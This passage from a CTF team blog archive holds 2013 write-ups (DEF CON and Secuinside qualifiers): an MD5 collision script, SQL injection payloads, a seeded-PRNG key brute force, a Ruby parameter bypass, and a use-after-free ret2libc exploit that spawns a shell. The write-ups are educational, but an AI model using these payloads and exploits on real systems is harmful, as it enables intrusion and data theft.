                ctr_3 = ((ctr_2 &lt;&lt; 3) - ctr_2) &amp; 0xf;
            }

            // 0x4025ce
            string_6 = string_4;
            string_4 = string_3;
            string_3 = string_2;
            unsigned int ebx = string_1 + string_5;
            double sin_result = sin((double)(ctr_2 + 1));
            double d = sin_result * sin_result;
            double e = sqrt(d) * 4.294967296e9;
            unsigned long y = ebx + (unsigned long)e + buffer_A[ctr_3];
            ebx = (y &lt;&lt; (BOX[ctr_2] &amp; 0xff));
            d = sin((double)(ctr_2 + 1));
            d = d * d;
            e = sqrt(d) * 4.294967296e9;
            unsigned int x1 = string_5 + string_1 + (unsigned long)e + buffer_A[ctr_3];
            unsigned int x2 = 0x20 - BOX[ctr_2];
            string_2 = string_2 + ((x1 &gt;&gt; (x2 &amp; 0xff)) | ebx);
            string_1 = string_6;
            ++ctr_2;
        }
        unsigned int x = *(unsigned int*)IV;
        x += string_1;
        *(unsigned int*)IV = x;
        x = *(unsigned int*)(IV + 4);
        x += string_2;
        *(unsigned int*)(IV + 4) = x;
        x = *(unsigned int*)(IV + 8);
        x += string_3;
        *(unsigned int*)(IV + 8) = x;
        x = *(unsigned int*)(IV + 12);
        x += string_4;
        *(unsigned int*)(IV + 12) = x;
        input_size_2 += 0x40;
    }

    free(buffer_ptr);
    memcpy(output, IV, 16);
    return;
}
</code></pre>

<p>According to <a href="http://en.wikipedia.org/wiki/Md5#Pseudocode">Wikipedia</a>, it is a revised MD5. The IV is changed to &#8220;hi my name is it&#8221;. To find a collision, you may download and compile <a href="http://dl.packetstormsecurity.net/crypt/md/md5coll.c">md5coll</a> by Patrick Stach, and execute it with new IV.</p>

<pre><code>fish@fish-Linux-Mint-13 ~/defconctf/tastycloud $ ./md5coll-optimized 0x6d206968 0x616e2079 0x6920656d 0x74692073
block #1 done
block #2 done
unsigned int m0[32] = {
0xf5ff5286, 0xd5187d3b, 0x30dd0e80, 0xca85cc02, 
0x9747a14e, 0xc832351a, 0xcd333352, 0x16602937, 
0x0632ecc1, 0x62b34dff, 0x83aee8f3, 0xd2c11b1d, 
0x098950f8, 0x37dbacfa, 0x85abc37e, 0x1aac555a, 
0x7ac11e49, 0x050463bb, 0xd3c58401, 0xd4d5dd63, 
0xc6761a4f, 0x0dd022c4, 0x16696944, 0xe02da950, 
0x747aeff5, 0x487cf5cc, 0xaae46a9a, 0x3e9ed485, 
0xfd2968ee, 0x025bcaa4, 0x68f2289f, 0x4d353e49, 
};

unsigned int m1[32] = {
0xf5ff5286, 0xd5187d3b, 0x30dd0e80, 0xca85cc02, 
0x1747a14e, 0xc832351a, 0xcd333352, 0x16602937, 
0x0632ecc1, 0x62b34dff, 0x83aee8f3, 0xd2c19b1d, 
0x098950f8, 0x37dbacfa, 0x05abc37e, 0x1aac555a, 
0x7ac11e49, 0x050463bb, 0xd3c58401, 0xd4d5dd63, 
0x46761a4f, 0x0dd022c4, 0x16696944, 0xe02da950, 
0x747aeff5, 0x487cf5cc, 0xaae46a9a, 0x3e9e5485, 
0xfd2968ee, 0x025bcaa4, 0xe8f2289f, 0x4d353e49, 
};
</code></pre>

<p>So here is the final Python script to get the key.</p>

<pre><code>import sys, os, time, struct, socket

HOST = "tastycloud.shallweplayaga.me"
PORT = 6283

data1 = "\x86\x52\xff\xf5\x3b\x7d\x18\xd5\x80\x0e\xdd\x30\x02\xcc\x85\xca\x4e\xa1\x47\x97\x1a\x35\x32\xc8\x52\x33\x33\xcd\x37\x29\x60\x16\xc1\xec\x32\x06\xff\x4d\xb3\x62\xf3\xe8\xae\x83\x1d\x1b\xc1\xd2\xf8\x50\x89\x09\xfa\xac\xdb\x37\x7e\xc3\xab\x85\x5a\x55\xac\x1a\x49\x1e\xc1\x7a\xbb\x63\x04\x05\x01\x84\xc5\xd3\x63\xdd\xd5\xd4\x4f\x1a\x76\xc6\xc4\x22\xd0\x0d\x44\x69\x69\x16\x50\xa9\x2d\xe0\xf5\xef\x7a\x74\xcc\xf5\x7c\x48\x9a\x6a\xe4\xaa\x85\xd4\x9e\x3e\xee\x68\x29\xfd\xa4\xca\x5b\x02\x9f\x28\xf2\x68\x49\x3e\x35\x4d"
data2 = "\x86\x52\xff\xf5\x3b\x7d\x18\xd5\x80\x0e\xdd\x30\x02\xcc\x85\xca\x4e\xa1\x47\x17\x1a\x35\x32\xc8\x52\x33\x33\xcd\x37\x29\x60\x16\xc1\xec\x32\x06\xff\x4d\xb3\x62\xf3\xe8\xae\x83\x1d\x9b\xc1\xd2\xf8\x50\x89\x09\xfa\xac\xdb\x37\x7e\xc3\xab\x05\x5a\x55\xac\x1a\x49\x1e\xc1\x7a\xbb\x63\x04\x05\x01\x84\xc5\xd3\x63\xdd\xd5\xd4\x4f\x1a\x76\x46\xc4\x22\xd0\x0d\x44\x69\x69\x16\x50\xa9\x2d\xe0\xf5\xef\x7a\x74\xcc\xf5\x7c\x48\x9a\x6a\xe4\xaa\x85\x54\x9e\x3e\xee\x68\x29\xfd\xa4\xca\x5b\x02\x9f\x28\xf2\xe8\x49\x3e\x35\x4d"

s = socket.socket()
s.connect((HOST, PORT))
size = len(data1) + len(data2)

s.send(struct.pack("I",size))
s.send(data1)
s.send(data2)

print s.recv(1024)
</code></pre>

<p>Run the script, we get the key: <strong>pringlelingus and redbull without a cause</strong></p>

<p>This is one of the few challenges that we didn&#8217;t manage to solve during the game. It&#8217;s a pity as we finally noticed the final hashing algorithm is a revised MD5, however we have no time to construct a collision. It&#8217;s all my fault that I didn&#8217;t realized it was a MD5 as soon as possible <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_razz.gif' alt=':P' class='wp-smiley' /> . Many thanks to NWMonster, Slipper and cq for their precious help.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/def-con-ctf-qualifier-2013-3dub-5-writeup/">DEF CON CTF Qualifier 2013 3dub 5 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-17T00:00:00+08:00" pubdate data-updated="true">Jun 17<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This task was solved by <em>aay</em> soon after the the problem came up.ym.</p>

<p>The initial intention of the organizer is that the vulnerability is in session and the cookie is decrypt byte per byte so we can post some username like &#8216;admiX&#8217; and brute force the ciphertext of the last letter to get the admin&#8217;s session.However there&#8217;s another quick way to achieve the goal.</p>

<p>As we visited the page, corresponding to the experience of solving the 3dub problem before, we tried to login as admin.But the ruby program had a runtime error.We thought that we should decode and construct the cookie.</p>

<p>From the backtrace, we can get some code</p>

<pre><code>get '/' do
  haml :index
end

post '/' do
  if params[:username] == 'admin'
    raise "can't log in as admin, be smarter"
end

cipher = make_cipher
cipher.encrypt
cipher.key = CRYPTO_KEY
iv = cipher.random_iv
</code></pre>

<p>That says the POST variable username is checked and cannot be admin.The key point is that we can use <strong>username[]</strong> to bypass since Array is a totally different thing from String.So just modify the form&#8217;s field from <em>username</em> to <em>username[]</em> and it takes effect.The problem is solved so far.</p>

<p>However, the fact that really confuse me is that since username[] is an Array, why the program manages to run correctly by username[] which replaces username.</p>

<p>I happened to find some clue later.Just changed the <em>username</em> field to <em>username[]</em> and added a new POST field <em>username[][]</em> and then submitted it.The program had another error: <strong>ArgumentError at / odd number of arguments for Hash</strong>, and the backtrace with some new code.</p>

<pre><code>end

cipher = make_cipher
cipher.encrypt
cipher.key = CRYPTO_KEY
iv = cipher.random_iv

plaintext = Hash[*params.sort.flatten].to_param

ciphertext = cipher.update plaintext
ciphertext &amp;lt;&amp;lt; cipher.final

cookies[:iv] = iv
cookies[:ciphertext] = ciphertext
cookies[:verification] = params[:verification]
</code></pre>

<p>Now we can have a clear view on how the cookies are generated.And pay attention to the following code:</p>

<pre><code>plaintext = Hash[*params.sort.flatten].to_param
</code></pre>

<p>The params list is sorted and then flattened which means that the inner square brackets [] are token out so that [&lsquo;admin&rsquo;] are changed into &#8216;admin&#8217;.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/def-con-ctf-qualifier-2013-3dub-4-writeup/">DEF CON CTF Qualifier 2013 3dub 4 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-17T00:00:00+08:00" pubdate data-updated="true">Jun 17<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>The webpage is like this</p>

<pre><code>Admin Files

usernames.txt
passwords.txt
Login Here
</code></pre>

<p>You can view the usernames.txt</p>

<p>and the URL is</p>

<pre><code>http://rememberme.shallweplayaga.me/getfile.php?filename=usernames.txt&amp;amp;accesscode=60635c6862d44e8ac17dc5e144c66539
</code></pre>

<p>Guessing that the accesscode is one kind of hash of username.txt, after test, we can see</p>

<pre><code>MD5 ("usernames.txt") = 60635c6862d44e8ac17dc5e144c66539
</code></pre>

<p>Then we can view other things in this site by building the valid URL</p>

<p>By this way, we can see the getfile.php</p>

<pre><code>Acces granted to getfile.php!

$value = time();
$filename = $_GET["filename"];
$accesscode = $_GET["accesscode"];
if (md5($filename) == $accesscode){
echo "Acces granted to $filename!";

srand($value);
if (in_array($filename, array('getfile.php', 'index.html', 'key.txt', 'login.php', 'passwords.txt', 'usernames.txt'))==TRUE){
$data = file_get_contents($filename);
if ($data !== FALSE) {
if ($filename == "key.txt") {
$key = rand();
$cyphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC);
echo base64_encode($cyphertext);
}
else{
echo nl2br($data);
}

}
else{
echo "File does not exist";
}
}
else{
echo "File does not exist";
}

}
else{
echo "Invalid access code";
}
?&amp;gt;
</code></pre>

<p>And there is a key.txt can view by this URL</p>

<pre><code>http://rememberme.shallweplayaga.me/getfile.php?filename=key.txt&amp;amp;accesscode=65c2a527098e1f7747eec58e1925b453
</code></pre>

<p>the context is</p>

<pre><code>Acces granted to key.txt!

TEu4LOi+D8CU/+fjK6RUj3CnBuqjfTYA8IgWPNXFEV3R1bDvGLwDA3+1Ew9tdrFqbjonjRUebZBXFL6LdP69wQ==
</code></pre>

<p>the encrypt process can be seen in the getfile.php</p>

<p>So the way to solve this porblem is refresh the</p>

<pre><code>http://rememberme.shallweplayaga.me/getfile.php?filename=key.txt&amp;amp;accesscode=65c2a527098e1f7747eec58e1925b453
</code></pre>

<p>and write a native phpfile having</p>

<pre><code>echo time();
</code></pre>

<p>so you will see a time, you should set it as a seed to generate the $key.</p>

<p>At that time, I got the encrypt key is</p>

<pre><code>TEu4LOi+D8CU/+fjK6RUj3CnBuqjfTYA8IgWPNXFEV3R1bDvGLwDA3+1Ew9tdrFqbjonjRUebZBXFL6LdP69wQ==
</code></pre>

<p>and the time is 1371387200</p>

<p>We should search +-1000 around 1371387200.</p>

<p>So I write this piece of code</p>

<pre><code>$i = 1;
while($i &amp;lt; 2000) 
{
    $value = 1371387200-1000+$i;
    $data = &amp;quot;TEu4LOi+D8CU/+fjK6RUj3CnBuqjfTYA8IgWPNXFEV3R1bDvGLwDA3+1Ew9tdrFqbjonjRUebZBXFL6LdP69wQ==&amp;quot;;
    $data = base64_decode($data);
    srand($value);
    $key = rand();
    $plaintext = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC);
    echo $plaintext;
    $i++;
}
</code></pre>

<p>run it in your own computer and use Command + f or Ctrl + f to find</p>

<pre><code>The key is
</code></pre>

<p>You will see the key~</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/def-con-ctf-qualifier-2013-3dub-2-writeup/">DEF CON CTF Qualifier 2013 3dub 2 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-17T00:00:00+08:00" pubdate data-updated="true">Jun 17<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This is just another appetizer.</p>

<p>URL is</p>

<pre><code>http://babysfirst.shallweplayaga.me:8041/
</code></pre>

<p>First I login use</p>

<pre><code>username:    admin' or '1'='1
password:    admin' or '1'='1
</code></pre>

<p>Then I got in it as root but see nothing, Seeing the header, there is the SQL query that made by me, It&#8217;s kindly like a SQLi problem.</p>

<p>By this</p>

<pre><code>a' UNION ALL SELECT sqlite_version() --
</code></pre>

<p>I see some number represent that the database behind the webpage is sqlite.</p>

<p>Then it is easy</p>

<pre><code>a' UNION ALL SELECT name from sqlite_master --
</code></pre>

<p>It returns</p>

<pre><code>babysfirst

success!

logged in as keys
</code></pre>

<p>Then</p>

<pre><code>a' UNION ALL SELECT * from keys --
</code></pre>

<p>You will get the key.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/def-con-ctf-qualifier-2013-3dub-1-writeup/">DEF CON CTF Qualifier 2013 3dub 1 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-17T00:00:00+08:00" pubdate data-updated="true">Jun 17<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This is just a appetizer.</p>

<p>URL is</p>

<pre><code>http://badmedicine.shallweplayaga.me:8042/
</code></pre>

<p>When you see the webpage, you see some login form and you can login as anyone but not admin.</p>

<pre><code>badmedicine

admin login disabled
</code></pre>

<p>The cat is in the cookie, you will see your username is in someway(some hash?) become the cookie, then I got the idea to change the cookie which represent admin.</p>

<p>I use firefox and burpsuite to deal with this idea and then I got the key.</p>

<p>It’s too easy and no law to see(lol, you should understand this piece of English via Chinese)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/secuinside-ctf-2013-quals-movie_talk-writeup/">Secuinside CTF 2013 Quals Movie_talk Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-11T00:00:00+08:00" pubdate data-updated="true">Jun 11<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>The program is a local console application that maintain information about movies. It provides add, delete, list operations for users. We noticed that there is a SIGQUIT(number 3) handler to free all allocated data structure of movies, but it failed to clean the pointers of movies, which leads to a use after free bug. Data structure of a movie is as below:</p>

<pre><code>struct Movie
{
  void *handler;
  char *name;
  int id;
  int rating;
  int rate
};
</code></pre>

<p>For each movie, the memories for the <code>Movie</code> struct and <code>Movie-&gt;name</code> are allocated on the heap. First, we can add a movie. Then, we add the second. However, at the moment before the program prompt to get movie name, we send SIGQUIT and get the first movie structure freed. Then the program get back to receive the second movie&#8217;s name. If we input a string with a appropriate length, the allocated chunk for the second movie&#8217;s name could be the same as the first movie&#8217;s struct, which has just been freed. Luckily, the pointer of the first movie still points to the original chunk. Thus, the first 4 bytes of the second movie&#8217;s name will become the first movie&#8217;s handler, which can be used controlled.</p>

<p>We use an <code>add esp</code> gadget to migrate the stack to a very high position of the stack. Then we put a lot of common <code>ret2libc</code> combinations <code>system|system|"/bin/sh"|"/bin/sh"</code> in an environment variable, which is right in the higher part of the stack. If the <code>add esp</code> gadget migrate the stack top and hit the one of the <code>system</code> addresses in the environment variable, a shell will be spawned.</p>

<p>Of course, we used the <code>ulimit -s unlimited</code> trick to disable ASLR of the shared library. We get the precise address of <code>system</code> and <code>"/binsh"</code> from the libc library. The environment variable defined by us is as below:</p>

<pre><code>export EXPLOIT=$(python -c 'print "a"*9 + "\x80\xb2\x06\x40\x80\xb2\x06\x40\xf8\x2f\x19\x40\xf8\x2f\x19\x40" * 2000+"a"*15')
</code></pre>

<p>Python script for exploitation is as below:</p>

<pre><code>import sys
import os
import subprocess
import signal
import time
p = subprocess.Popen("./movie_talk", stdin=subprocess.PIPE)
# add $0x228c,%esp
addesp = "\xed\x15\x14\x40"
# add first movie
p.stdin.write("1\n1\n1\n0\n")
time.sleep(3);
# add second movie
p.stdin.write("1\n")
time.sleep(1)
# free all movies
p.send_signal(3)
p.stdin.write(addesp + "AAAABBB\n1\n0\n")
time.sleep(3)
# use after free
p.stdin.write("3\n")
time.sleep(1)
# execute shell command
p.stdin.write("cat key.txt\n")
time.sleep(1)
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/secuinside-2013-save_the_zombie-writeup/">Secuinside 2013 Save_the_zombie Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-09T00:00:00+08:00" pubdate data-updated="true">Jun 9<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Two binaries are provided for this task, which are <em>Apache2</em> and <em>cli.exe</em>. <em>Apache2</em> is an ELF running under Linux, which is obviously packed, therefore static analysis seems impossible.</p>

<p>Really? Let&#8217;s statically analyze the core-dump. Run <em>Apache2</em>, let gdb attach to the process, and execute <strong>generate-core-file</strong>. A core-dump of the target process is generated, which contains all unpacked instructions. Now it&#8217;s time for IDA <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_biggrin.gif' alt=':D' class='wp-smiley' /> .</p>

<p>A quick analysis told us that the <em>Apache2</em> is a daemon listening on a server, waiting for zombies to connect back and register themselves (with a special header field in HTTP request). Their IPs and ports are logged in a plain text file /t/a. Look at the other executable <em>cli.exe</em>, and we found it to be the actual backdoor program that runs on compromized zombies. It could accept commands from attackers to list any directories or echo the content of any files. Hence we should find the zombie and ask it to read the flag file for us. But&#8230; where is the zombie?</p>

<p>It doesn&#8217;t take too much time before we found the <em>Apache2</em> is running on the specified server, and <a href="http://54.214.248.168/t/a">http://54.214.248.168/t/a</a> is the zombies-list. So let&#8217;s write a script, which is extremely easy, and make it connect to that machine, list all files in the current working directory, and read the key file out.</p>

<p>We eventually got the key: <strong>Night Of The Living Dead</strong></p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/3/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
      </li>
    
      <li class="post">
        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
